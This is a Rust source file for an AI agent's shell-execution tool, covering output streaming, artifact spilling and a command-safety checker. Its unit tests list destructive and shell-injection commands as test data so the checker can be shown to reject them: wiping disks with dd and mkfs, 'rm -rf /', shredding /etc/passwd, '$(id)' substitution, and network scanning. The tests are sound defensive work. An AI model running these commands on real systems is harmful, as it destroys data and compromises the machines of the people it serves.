                            artifact_capture.push(ToolOutputChannel::Stderr, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stderr, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Ok(count) => {
                        let bytes = stderr_buffer.get(..count).unwrap_or_default();
                        let retained = retained_stdout
                            .bytes
                            .len()
                            .saturating_add(retained_stderr.bytes.len());
                        retained_stderr.push(bytes, MAX_RETAINED_OUTPUT_BYTES.saturating_sub(retained));
                        for chunk in stderr_decoder.push(bytes) {
                            artifact_capture.push(ToolOutputChannel::Stderr, &chunk);
                            if send_output(&tx, ToolOutputChannel::Stderr, chunk).await.is_err() {
                                cleanup_direct_child(child).await;
                                return;
                            }
                        }
                    }
                    Err(_) => stderr = None,
                }
            }
            waited = child.wait(), if status.is_none() => {
                match waited {
                    Ok(exit_status) => status = Some(exit_status),
                    Err(_) => {
                        cleanup_direct_child(child).await;
                        status = None;
                        break;
                    }
                }
            }
        }
    }

    let exit_code = status.and_then(|status| status.code()).unwrap_or(-1);
    let result = artifact_capture.finish(build_tool_result(
        exit_code,
        retained_stdout,
        retained_stderr,
        start.elapsed(),
        working_dir.as_ref(),
        false,
    ));
    let _ = tx.send(ToolStreamEvent::Complete(result)).await;
}

/// 将输出文本按 UTF-8 边界分块后发送到事件通道
async fn send_output(
    tx: &mpsc::Sender<ToolStreamEvent>,
    channel: ToolOutputChannel,
    text: String,
) -> std::result::Result<(), ()> {
    for chunk in split_utf8_chunks(text, STREAM_CHUNK_BYTES) {
        tx.send(ToolStreamEvent::Output { channel, chunk })
            .await
            .map_err(|_| ())?;
    }
    Ok(())
}

/// 杀死子进程（Unix 下连同其进程组）并回收
async fn cleanup_direct_child(child: &mut tokio::process::Child) {
    #[cfg(unix)]
    if let Some(pid) = child.id() {
        let _ = std::process::Command::new("kill")
            .args(["-KILL", &format!("-{pid}")])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .status();
    }
    let _ = child.kill().await;
    let _ = child.wait().await;
}

/// 在内存中保留的进程输出（带容量上限）
#[derive(Default)]
struct RetainedOutput {
    /// 已保留的输出字节
    bytes: Vec<u8>,
    /// 实际产生的输出总字节数（含未保留部分）
    total_bytes: u64,
    /// 是否因容量上限发生截断
    truncated: bool,
}

/// 将命令输出同步写入产物（artifact）文件的捕获器
struct ArtifactCapture {
    /// 产物写入器；写入失败或未配置时为 `None`
    writer: Option<ToolOutputArtifactWriter>,
    /// 写入过程中记录的错误信息
    error: Option<String>,
}

impl ArtifactCapture {
    /// 根据上下文中的产物配置创建捕获器
    fn new(ctx: &ToolContext, tool_name: &str) -> Self {
        let writer = ctx.output_artifacts.clone().map(|config| {
            ToolOutputArtifactWriter::new(
                config,
                ToolOutputArtifactIdentity::from_context(ctx, tool_name),
            )
        });
        Self {
            writer,
            error: None,
        }
    }

    /// 将一段输出写入产物；失败时记录错误并停止后续写入
    fn push(&mut self, channel: ToolOutputChannel, text: &str) {
        let Some(writer) = self.writer.as_mut() else {
            return;
        };
        if let Err(error) = writer.push_channel(channel, text) {
            tracing::warn!(error = %error, "shell output artifact write failed");
            self.error = Some(error.to_string());
            self.writer = None;
        }
    }

    /// 完成产物写入，并将产物引用或写入错误附加到结果
    fn finish(&mut self, mut result: ToolResult) -> ToolResult {
        let artifact = match self.writer.take() {
            Some(writer) => match writer.finish() {
                Ok(artifact) => artifact,
                Err(error) => {
                    tracing::warn!(error = %error, "shell output artifact finalize failed");
                    self.error = Some(error.to_string());
                    None
                }
            },
            None => None,
        };
        if let Some(artifact) = artifact {
            apply_artifact(artifact, &mut result);
        } else if let Some(error) = self.error.take() {
            result
                .metadata
                .insert("artifact_status".to_string(), "write_failed".to_string());
            result.metadata.insert("artifact_error".to_string(), error);
        }
        result
    }
}

/// 将产物引用写入工具结果，并更新相关的截断元数据
fn apply_artifact(artifact: ToolOutputArtifactRef, result: &mut ToolResult) {
    let original_bytes = result
        .metadata
        .get("stdout_bytes")
        .and_then(|value| value.parse::<u64>().ok())
        .unwrap_or(0)
        .saturating_add(
            result
                .metadata
                .get("stderr_bytes")
                .and_then(|value| value.parse::<u64>().ok())
                .unwrap_or(0),
        );
    let payload_bytes = artifact.payload_bytes;
    result.artifact = Some(artifact);
    result
        .metadata
        .insert("output_handling".to_string(), "spilled".to_string());
    result.metadata.insert(
        "original_bytes".to_string(),
        if original_bytes == 0 {
            payload_bytes
        } else {
            original_bytes
        }
        .to_string(),
    );
    result.truncated = true;
    result
        .metadata
        .insert("output_truncated".to_string(), "true".to_string());
}

impl RetainedOutput {
    /// 记录输出字节，在剩余容量内保留前缀并更新截断标记
    fn push(&mut self, bytes: &[u8], remaining_capacity: usize) {
        self.total_bytes = self
            .total_bytes
            .saturating_add(u64::try_from(bytes.len()).unwrap_or(u64::MAX));
        let retain = remaining_capacity.min(bytes.len());
        if let Some(prefix) = bytes.get(..retain) {
            self.bytes.extend_from_slice(prefix);
        }
        self.truncated |= retain < bytes.len();
    }

    /// 以有损 UTF-8 方式返回已保留的文本
    fn text(&self) -> String {
        String::from_utf8_lossy(&self.bytes).to_string()
    }
}

/// 根据退出码、保留输出与耗时构建直接执行路径的工具结果
fn build_tool_result(
    exit_code: i32,
    stdout: RetainedOutput,
    stderr: RetainedOutput,
    duration: Duration,
    working_dir: Option<&std::path::PathBuf>,
    timed_out: bool,
) -> ToolResult {
    let stdout_text = stdout.text();
    let stderr_text = stderr.text();
    let truncated = stdout.truncated || stderr.truncated;
    let mut result = if exit_code == 0 && !timed_out {
        ToolResult::success_with_kind(
            ToolResultKind::CommandOutput {
                exit_code: Some(exit_code),
            },
            stdout_text,
        )
    } else {
        let final_output = combined_process_output(&stdout_text, &stderr_text);
        let message = if timed_out {
            format!("Command timeout\nstdout: {stdout_text}\nstderr: {stderr_text}")
        } else {
            format!(
                "Command execution failed, exit code: {exit_code}\nstdout: {stdout_text}\nstderr: {stderr_text}"
            )
        };
        let failure = if timed_out {
            ToolFailure::new(ToolFailureCategory::Timeout)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition(
                    "verify the process stopped and inspect command targets before retrying",
                )
        } else {
            ToolFailure::new(ToolFailureCategory::Permanent)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition("inspect command output and affected targets before continuing")
        };
        ToolResult::error(message)
            .with_failure(failure)
            .with_output(final_output)
    };
    result.kind = ToolResultKind::CommandOutput {
        exit_code: Some(exit_code),
    };
    result.truncated = truncated;
    result
        .with_meta("duration_ms", duration.as_millis().to_string())
        .with_meta("exit_code", exit_code.to_string())
        .with_meta(
            "working_dir",
            working_dir
                .map(|dir| dir.display().to_string())
                .unwrap_or_default(),
        )
        .with_meta("output_truncated", truncated.to_string())
        .with_meta("stdout_bytes", stdout.total_bytes.to_string())
        .with_meta("stderr_bytes", stderr.total_bytes.to_string())
}

/// 将沙箱执行结果转换为工具结果
fn tool_result_from_execution(
    result: echo_core::sandbox::ExecutionResult,
    working_dir: Option<&std::path::PathBuf>,
) -> ToolResult {
    let timed_out = result.timed_out;
    let stdout_bytes = if result.stdout_bytes == 0 {
        u64::try_from(result.stdout.len()).unwrap_or(u64::MAX)
    } else {
        result.stdout_bytes
    };
    let stderr_bytes = if result.stderr_bytes == 0 {
        u64::try_from(result.stderr.len()).unwrap_or(u64::MAX)
    } else {
        result.stderr_bytes
    };
    let mut tool_result = if result.success() {
        ToolResult::success_with_kind(
            ToolResultKind::CommandOutput {
                exit_code: Some(result.exit_code),
            },
            result.stdout,
        )
    } else {
        let final_output = combined_process_output(&result.stdout, &result.stderr);
        let failure = if timed_out {
            ToolFailure::new(ToolFailureCategory::Timeout)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition(
                    "verify the sandbox process stopped and inspect command targets before retrying",
                )
        } else {
            ToolFailure::new(ToolFailureCategory::Permanent)
                .with_side_effect(ToolSideEffect::Possible)
                .with_postcondition("inspect command output and affected targets before continuing")
        };
        ToolResult::error(format!(
            "Command execution failed, exit code: {}\nstdout: {}\nstderr: {}",
            result.exit_code, result.stdout, result.stderr
        ))
        .with_failure(failure)
        .with_output(final_output)
    };
    tool_result.kind = ToolResultKind::CommandOutput {
        exit_code: Some(result.exit_code),
    };
    tool_result.truncated = result.output_truncated;
    tool_result
        .with_meta("duration_ms", result.duration.as_millis().to_string())
        .with_meta("exit_code", result.exit_code.to_string())
        .with_meta(
            "working_dir",
            working_dir
                .map(|dir| dir.display().to_string())
                .unwrap_or_default(),
        )
        .with_meta("output_truncated", result.output_truncated.to_string())
        .with_meta("stdout_bytes", stdout_bytes.to_string())
        .with_meta("stderr_bytes", stderr_bytes.to_string())
}

/// 合并 stdout 与 stderr 作为最终输出
fn combined_process_output(stdout: &str, stderr: &str) -> String {
    if stderr.is_empty() {
        stdout.to_string()
    } else if stdout.is_empty() {
        stderr.to_string()
    } else {
        format!("{stdout}\n{stderr}")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use echo_core::sandbox::{ExecutionResult, IsolationLevel};
    use echo_core::tools::cell::{
        CommandCellArtifactStatus, CommandCellDelta, CommandCellError, CommandCellLaunchReceipt,
        CommandCellObservationLease, CommandCellPhase, CommandCellSnapshot, CommandCellWaitReason,
    };
    use echo_core::tools::{ToolContext, ToolOutputChannel, ToolStreamEvent};
    use futures::StreamExt;
    use std::collections::HashMap;

    /// 测试用沙箱，始终返回成功的空结果
    struct TestSandbox;

    impl SandboxExecutor for TestSandbox {
        /// 返回测试沙箱名称
        fn name(&self) -> &str {
            "test"
        }

        /// 返回进程级隔离
        fn isolation_level(&self) -> IsolationLevel {
            IsolationLevel::Process
        }

        /// 始终可用
        fn is_available(&self) -> BoxFuture<'_, bool> {
            Box::pin(async { true })
        }

        /// 返回空的成功结果
        fn execute(
            &self,
            _command: SandboxCommand,
        ) -> BoxFuture<'_, echo_core::error::Result<ExecutionResult>> {
            Box::pin(async {
                Ok(ExecutionResult {
                    exit_code: 0,
                    stdout: String::new(),
                    stderr: String::new(),
                    duration: Duration::ZERO,
                    sandbox_type: "test".to_string(),
                    timed_out: false,
                    cancelled: false,
                    output_truncated: false,
                    stdout_bytes: 0,
                    stderr_bytes: 0,
                })
            })
        }
    }

    /// 记录最近一次启动请求的测试用 cell 注册表
    #[derive(Default)]
    struct CapturingCellRegistry {
        /// 最近一次收到的启动请求
        request: Mutex<Option<CommandCellRequest>>,
    }

    impl CommandCellRegistry for CapturingCellRegistry {
        /// 记录启动请求并返回固定的回执
        fn launch(
            &self,
            request: CommandCellRequest,
        ) -> BoxFuture<'_, std::result::Result<CommandCellLaunchReceipt, CommandCellError>>
        {
            *self
                .request
                .lock()
                .unwrap_or_else(|poisoned| poisoned.into_inner()) = Some(request);
            Box::pin(async {
                let accepted_at = chrono::Utc::now();
                Ok(CommandCellLaunchReceipt {
                    cell_id: "captured-cell".to_string(),
                    accepted_at,
                    deadline: accepted_at + chrono::Duration::seconds(60),
                })
            })
        }

        /// 返回运行中状态的空增量
        fn wait(
            &self,
            cell_id: &str,
            cursor: u64,
            _yield_ms: u64,
        ) -> BoxFuture<'_, std::result::Result<CommandCellDelta, CommandCellError>> {
            let cell_id = cell_id.to_string();
            Box::pin(async move {
                Ok(CommandCellDelta {
                    snapshot: CommandCellSnapshot {
                        cell_id,
                        name: "captured".to_string(),
                        phase: CommandCellPhase::Running,
                        exit_code: None,
                        terminal_cause: None,
                        terminal_message: None,
                        total_output_bytes: cursor,
                        output_truncated: false,
                        artifact_status: CommandCellArtifactStatus::NotRequested,
                        artifact_message: None,
                        output_artifact: None,
                    },
                    wait_reason: CommandCellWaitReason::YieldElapsed,
                    new_output: String::new(),
                    next_cursor: cursor,
                    output_elided: false,
                })
            })
        }

        /// 返回空操作的观察租约
        fn observe(
            &self,
            cell_id: &str,
        ) -> std::result::Result<CommandCellObservationLease, CommandCellError> {
            Ok(CommandCellObservationLease::new(cell_id, || {}))
        }

        /// 始终报告停止成功
        fn stop(&self, _cell_id: &str) -> bool {
            true
        }

        /// 返回空列表
        fn list(&self) -> BoxFuture<'_, Vec<CommandCellSnapshot>> {
            Box::pin(async { Vec::new() })
        }

        /// 直接返回成功
        fn shutdown(&self) -> BoxFuture<'_, std::result::Result<(), CommandCellError>> {
            Box::pin(async { Ok(()) })
        }
    }

    /// 验证白名单内的常见命令被判定为安全
    #[test]
    fn test_safe_commands() {
        let tool = ShellTool::new();

        // 安全命令
        assert_eq!(tool.check_command_safety("ls -la"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("pwd"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cat README.md"),
            CommandSafety::Safe
        );
        assert_eq!(tool.check_command_safety("git status"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cargo check"),
            CommandSafety::Safe
        );
    }

    /// 验证后台启动会保留沙箱要求并传递归属信息，而不是直接拒绝
    #[tokio::test]
    async fn background_launch_preserves_sandbox_requirement_instead_of_rejecting()
    -> std::result::Result<(), Box<dyn std::error::Error>> {
        let registry = Arc::new(CapturingCellRegistry::default());
        let tool = ShellTool::new()
            .with_cell_launcher(registry.clone())
            .with_sandbox(Arc::new(TestSandbox));
        let context = ToolContext {
            conversation_id: Some("conversation-1".to_string()),
            run_id: Some("run-that-may-be-paused".to_string()),
            message_id: Some("message-1".to_string()),
            cancel: Some(Arc::new(echo_core::agent::CancellationToken::new())),
            ..Default::default()
        };
        let result = tool
            .execute_with_context(
                HashMap::from([
                    ("command".to_string(), serde_json::json!("echo sandboxed")),
                    ("background".to_string(), serde_json::json!(true)),
                ]),
                &context,
            )
            .await?;
        assert!(result.success, "background launch failed: {result:?}");
        let request = registry
            .request
            .lock()
            .unwrap_or_else(|poisoned| poisoned.into_inner())
            .clone()
            .ok_or_else(|| "cell registry did not receive the launch".to_string())?;
        assert!(request.require_sandbox);
        assert!(request.cancel.is_none());
        assert_eq!(
            request.owner.conversation_id.as_deref(),
            Some("conversation-1")
        );
        assert_eq!(request.owner.message_id.as_deref(), Some("message-1"));
        Ok(())
    }

    /// 验证各类 shell 注入语法被拒绝
    #[test]
    fn test_shell_injection_rejected() {
        let tool = ShellTool::new();

        // 管道注入
        match tool.check_command_safety("ls | rm -rf /tmp") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Pipe injection should be rejected, got: {:?}", other),
        }

        // 命令替换注入
        match tool.check_command_safety("echo $(id)") {
            CommandSafety::Dangerous(_) => {}
            other => panic!(
                "Command substitution injection should be rejected, got: {:?}",
                other
            ),
        }

        // 反引号注入
        match tool.check_command_safety("echo `id`") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Backtick injection should be rejected, got: {:?}", other),
        }

        // 分号注入
        match tool.check_command_safety("ls; rm -rf /tmp/x") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Semicolon injection should be rejected, got: {:?}", other),
        }

        // 重定向注入
        match tool.check_command_safety("cat file > /etc/passwd") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Redirect injection should be rejected, got: {:?}", other),
        }

        // 条件执行注入
        match tool.check_command_safety("echo hello && rm -rf /") {
            CommandSafety::Dangerous(_) => {}
            other => panic!(
                "Conditional execution injection should be rejected, got: {:?}",
                other
            ),
        }

        // 子 shell 注入
        match tool.check_command_safety("$(dangerous)") {
            CommandSafety::Dangerous(_) => {}
            other => panic!("Subshell injection should be rejected, got: {:?}", other),
        }
    }

    /// 验证需要人工确认的命令被正确识别
    #[test]
    fn test_require_approval_commands() {
        let tool = ShellTool::new();

        // 需要确认的命令
        match tool.check_command_safety("rm -rf /tmp/test") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("rm command should require confirmation"),
        }

        match tool.check_command_safety("curl http://example.com") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("curl command should require confirmation"),
        }

        match tool.check_command_safety("npm install package") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("npm command should require confirmation"),
        }

        match tool.check_command_safety("python script.py") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("python command should require confirmation"),
        }
    }

    /// 验证危险命令被明确拒绝
    #[test]
    fn test_dangerous_commands() {
        let tool = ShellTool::new();

        // 极度危险的命令（明确拒绝）
        match tool.check_command_safety("dd if=/dev/zero of=/dev/sda") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("dd command should be rejected"),
        }

        match tool.check_command_safety("sudo apt install") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("sudo command should be rejected"),
        }

        match tool.check_command_safety("chmod 777 /etc/passwd") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("chmod command should be rejected"),
        }

        match tool.check_command_safety("reboot") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("reboot command should be rejected"),
        }
    }

    /// 验证 git 子命令的分级判定
    #[test]
    fn test_git_commands() {
        let tool = ShellTool::new();

        // Git 安全命令
        assert_eq!(tool.check_command_safety("git log"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("git diff"), CommandSafety::Safe);
        assert_eq!(tool.check_command_safety("git status"), CommandSafety::Safe);

        // 需要确认的 Git 命令
        match tool.check_command_safety("git commit -m 'test'") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git commit should require confirmation"),
        }

        match tool.check_command_safety("git push origin main") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git push should require confirmation"),
        }

        match tool.check_command_safety("git add .") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git add should require confirmation"),
        }

        match tool.check_command_safety("git clean -fd") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("git clean should require confirmation"),
        }

        // Git 危险命令
        match tool.check_command_safety("git reset --hard HEAD~1") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("git reset --hard should be rejected"),
        }
    }

    /// 验证 cargo 子命令的分级判定
    #[test]
    fn test_cargo_commands() {
        let tool = ShellTool::new();

        // Cargo 安全命令
        assert_eq!(
            tool.check_command_safety("cargo check"),
            CommandSafety::Safe
        );
        assert_eq!(tool.check_command_safety("cargo test"), CommandSafety::Safe);
        assert_eq!(
            tool.check_command_safety("cargo clippy"),
            CommandSafety::Safe
        );
        assert_eq!(
            tool.check_command_safety("cargo build"),
            CommandSafety::Safe
        );

        // 需要确认的 Cargo 命令
        match tool.check_command_safety("cargo run") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo run should require confirmation"),
        }

        match tool.check_command_safety("cargo install some-package") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo install should require confirmation"),
        }

        match tool.check_command_safety("cargo clean") {
            CommandSafety::RequiresApproval(_) => {}
            _ => panic!("cargo clean should require confirmation"),
        }
    }

    /// 验证严格模式下未知命令被拒绝
    #[test]
    fn test_unknown_command_in_strict_mode() {
        let tool = ShellTool::new(); // 默认严格模式

        match tool.check_command_safety("unknown_command") {
            CommandSafety::Dangerous(_) => {}
            _ => panic!("Unknown commands should be rejected in strict mode"),
        }
    }

    /// 验证工具执行时对安全/需确认/危险命令的处理
    #[tokio::test]
    async fn test_shell_tool_execution() {
        let tool = ShellTool::new();

        // 测试安全命令
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo hello"));
        let result = tool.execute(params).await.unwrap();
        assert!(result.success);
        assert!(result.output.contains("hello"));

        // 测试需要确认的命令
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("rm test.txt"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success);
        assert!(result.error.as_ref().unwrap().contains("confirmation"));

        // 测试危险命令
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("sudo reboot"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success);
        assert!(result.error.unwrap().contains("rejection"));
    }

    /// 验证 Shell 工具声明支持实时流式输出
    #[test]
    fn shell_tool_declares_live_streaming_support() {
        assert!(ShellTool::new().supports_streaming());
    }

    /// 验证进程退出前即可收到第一块输出
    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_emits_first_chunk_before_process_exit() {
        let script =
            create_test_script("live", "#!/bin/sh\nprintf first\nsleep 1\nprintf second\n");
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );

        let started = std::time::Instant::now();
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let first = tokio::time::timeout(std::time::Duration::from_millis(700), stream.next())
            .await
            .unwrap()
            .unwrap();

        assert!(started.elapsed() < std::time::Duration::from_millis(900));
        assert!(matches!(
            first,
            ToolStreamEvent::Output {
                channel: ToolOutputChannel::Stdout,
                ref chunk,
            } if chunk == "first"
        ));

        let mut complete = None;
        while let Some(event) = stream.next().await {
            if let ToolStreamEvent::Complete(result) = event {
                complete = Some(result);
            }
        }
        let result = complete.unwrap();
        assert!(result.success);
        assert_eq!(result.output, "firstsecond");
        assert_eq!(
            result.metadata.get("exit_code").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            result.metadata.get("output_truncated").map(String::as_str),
            Some("false")
        );
        assert_eq!(
            result.metadata.get("stdout_bytes").map(String::as_str),
            Some("11")
        );

        let _ = std::fs::remove_file(script);
    }

    /// 验证失败时保留 stderr 与退出码元数据
    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_failure_retains_stderr_and_exit_metadata() {
        let script = create_test_script("failure", "#!/bin/sh\nprintf broken >&2\nexit 7\n");
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );

        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let mut complete = None;
        let mut streamed_stderr = String::new();
        while let Some(event) = stream.next().await {
            match event {
                ToolStreamEvent::Output {
                    channel: ToolOutputChannel::Stderr,
                    chunk,
                } => streamed_stderr.push_str(&chunk),
                ToolStreamEvent::Complete(result) => complete = Some(result),
                _ => {}
            }
        }

        let result = complete.unwrap();
        assert!(!result.success);
        assert_eq!(streamed_stderr, "broken");
        assert_eq!(result.output, "broken");
        assert!(
            result
                .error
                .as_deref()
                .unwrap_or_default()
                .contains("broken")
        );
        assert_eq!(
            result.metadata.get("exit_code").map(String::as_str),
            Some("7")
        );
        assert_eq!(
            result.metadata.get("stderr_bytes").map(String::as_str),
            Some("6")
        );
        assert_eq!(
            result.failure.as_ref().map(|failure| failure.category),
            Some(ToolFailureCategory::Permanent)
        );
        assert_eq!(
            result.failure.as_ref().map(|failure| failure.side_effect),
            Some(ToolSideEffect::Possible)
        );

        let _ = std::fs::remove_file(script);
    }

    /// 验证跨多次管道读取被拆分的 Unicode 字符能正确还原
    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_preserves_unicode_split_across_pipe_reads() {
        let script = create_test_script(
            "unicode",
            "#!/bin/sh\nprintf '\\342'; sleep 0.05; printf '\\202'; sleep 0.05; printf '\\254'\n",
        );
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let mut streamed = String::new();
        let mut complete = None;
        while let Some(event) = stream.next().await {
            match event {
                ToolStreamEvent::Output {
                    channel: ToolOutputChannel::Stdout,
                    chunk,
                } => streamed.push_str(&chunk),
                ToolStreamEvent::Complete(result) => complete = Some(result),
                _ => {}
            }
        }

        assert_eq!(streamed, "€");
        assert_eq!(complete.unwrap().output, "€");
        let _ = std::fs::remove_file(script);
    }

    /// 验证保留输出受上限约束且报告真实总字节数
    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_caps_retained_output_and_reports_total_bytes() {
        let script = create_test_script(
            "truncate",
            "#!/bin/sh\nhead -c 1100000 /dev/zero | tr '\\000' x\n",
        );
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let mut complete = None;
        while let Some(event) = stream.next().await {
            if let ToolStreamEvent::Complete(result) = event {
                complete = Some(result);
            }
        }

        let result = complete.unwrap();
        assert!(result.success);
        assert!(result.truncated);
        assert_eq!(result.output.len(), MAX_RETAINED_OUTPUT_BYTES);
        assert_eq!(
            result.metadata.get("output_truncated").map(String::as_str),
            Some("true")
        );
        assert_eq!(
            result.metadata.get("stdout_bytes").map(String::as_str),
            Some("1100000")
        );
        let _ = std::fs::remove_file(script);
    }

    /// 验证 10MB 输出被完整写入产物文件
    #[cfg(unix)]
    #[tokio::test]
    async fn shell_stream_spills_complete_ten_megabyte_artifact()
    -> std::result::Result<(), Box<dyn std::error::Error>> {
        let script = create_test_script(
            "artifact",
            "#!/bin/sh\nhead -c 10500000 /dev/zero | tr '\\000' x\n",
        );
        let artifact_root = std::env::temp_dir().join(format!(
            "echo-shell-artifact-{}-{}",
            std::process::id(),
            nanoid_counter()
        ));
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(script.display().to_string()),
        );
        let context = ToolContext {
            conversation_id: Some("conversation-10mb".to_string()),
            run_id: Some("run-10mb".to_string()),
            call_id: Some("call-10mb".to_string()),
            output_artifacts: Some(echo_core::tools::artifact::ToolOutputArtifactConfig::new(
                &artifact_root,
                "test",
            )),
            ..ToolContext::default()
        };
        let mut stream = tool.execute_stream_with_context(params, &context).await?;
        let mut complete = None;
        while let Some(event) = stream.next().await {
            if let ToolStreamEvent::Complete(result) = event {
                complete = Some(result);
            }
        }

        let result = complete.ok_or_else(|| {
            std::io::Error::new(
                std::io::ErrorKind::UnexpectedEof,
                "missing shell completion",
            )
        })?;
        let artifact = result.artifact.as_ref().ok_or_else(|| {
            std::io::Error::new(std::io::ErrorKind::NotFound, "missing artifact reference")
        })?;
        let artifact_contents = std::fs::read(&artifact.path)?;
        assert!(result.success);
        assert!(result.truncated);
        assert_eq!(result.output.len(), MAX_RETAINED_OUTPUT_BYTES);
        assert!(artifact_contents.len() >= 10_500_000);
        assert_eq!(artifact.retention, "test");
        assert_eq!(artifact.sha256.len(), 64);

        let _ = std::fs::remove_file(script);
        let _ = std::fs::remove_dir_all(artifact_root);
        Ok(())
    }

    /// 验证丢弃输出流会杀死并回收子进程
    #[cfg(unix)]
    #[tokio::test]
    async fn dropping_shell_stream_kills_and_reaps_child() {
        let script = create_test_script(
            "cancel",
            "#!/bin/sh\necho $$ > \"$1\"\nprintf started\nsleep 30\n",
        );
        let pid_file = script.with_extension("pid");
        let tool = ShellTool::new_permissive();
        let mut params = HashMap::new();
        params.insert(
            "command".to_string(),
            serde_json::json!(format!("{} {}", script.display(), pid_file.display())),
        );
        let mut stream = tool
            .execute_stream_with_context(params, &ToolContext::default())
            .await
            .unwrap();
        let first = tokio::time::timeout(std::time::Duration::from_secs(2), stream.next())
            .await
            .unwrap()
            .unwrap();
        assert!(matches!(first, ToolStreamEvent::Output { .. }));
        drop(stream);

        let pid = std::fs::read_to_string(&pid_file)
            .unwrap()
            .trim()
            .to_string();
        let mut reaped = false;
        for _ in 0..20 {
            let alive = std::process::Command::new("kill")
                .args(["-0", &pid])
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .status()
                .map(|status| status.success())
                .unwrap_or(false);
            if !alive {
                reaped = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        assert!(reaped, "cancelled shell child {pid} should be reaped");

        let _ = std::fs::remove_file(script);
        let _ = std::fs::remove_file(pid_file);
    }

    /// 验证执行路径中的注入命令被拒绝
    #[tokio::test]
    async fn test_shell_injection_rejected_in_execution() {
        let tool = ShellTool::new();

        // 管道注入 → 拒绝
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("ls | rm -rf /tmp"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Pipe injection should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );

        // 命令替换 → 拒绝
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("echo $(id)"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Command substitution should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );

        // 分号注入 → 拒绝
        let mut params = HashMap::new();
        params.insert("command".to_string(), serde_json::json!("ls; echo pwned"));
        let result = tool.execute(params).await.unwrap();
        assert!(!result.success, "Semicolon injection should be rejected");
        assert!(
            result
                .error
                .as_ref()
                .unwrap()
                .contains("shell metacharacters")
        );
    }

    /// 危险命令语料测试：所有命令都不应被判定为安全
    #[test]
    fn test_dangerous_command_corpus() {
        /* RFC 5.1.4：集成测试——危险命令拦截率
         * 该语料中的每条命令都不能被判定为 Safe。 */
        let shell = ShellTool::new();

        // 应始终被拦截的命令（Dangerous）
        let always_dangerous = vec![
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "sudo rm -rf /",
            "sudo shutdown -h now",
            "chmod -R 777 /",
            "chown -R root:root /",
            "reboot",
            "shutdown -h now",
            "halt",
            "poweroff",
            "nmap -sS 192.168.1.0/24",
            "shred /etc/passwd",
            "fdisk /dev/sda",
        ];

        for cmd in &always_dangerous {
            let safety = shell.check_command_safety(cmd);
            assert!(
                matches!(safety, CommandSafety::Dangerous(_)),
                "Command '{}' should be Dangerous, got {:?}",
                cmd,
                safety
            );
        }

        // 应需要审批的命令（绝不能是 Safe）
        let requires_approval = vec![
            "rm -rf /tmp/test",
            "rm -rf ~",
            "rm -rf /*",
            "rmdir /tmp/dir",
            "mv /etc/passwd /tmp/",
